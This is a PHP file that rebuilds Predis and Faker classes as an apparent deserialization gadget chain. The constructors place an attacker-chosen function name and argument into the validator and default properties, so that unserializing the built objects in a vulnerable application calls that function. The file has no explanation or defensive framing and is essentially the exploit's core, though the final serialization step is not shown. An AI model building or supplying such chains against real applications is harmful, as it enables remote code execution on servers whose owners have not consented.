<?php
namespace Predis\Response\Iterator{
    class MultiBulk{
        protected $position;
        protected $size;
        private $connection;

        function __construct($function,$paramter)
        {
            $this->connection = new \Faker\ValidGenerator($function,$paramter);
            $this->position = 0;
            $this->size = 1;
        }
    }
}

namespace Faker{
    class ValidGenerator{
        protected $generator;
        protected $maxRetries;
        protected $validator;

        function __construct($function,$param)
        {
            $this->maxRetries = 1;
            $this->validator = $function;
            $this->generator = new \Faker\DefaultGenerator($param);
        }
    }

    class DefaultGenerator{
        protected $default;

        function __construct($param)
        {
            $this->default = $param;
        }
    }
}
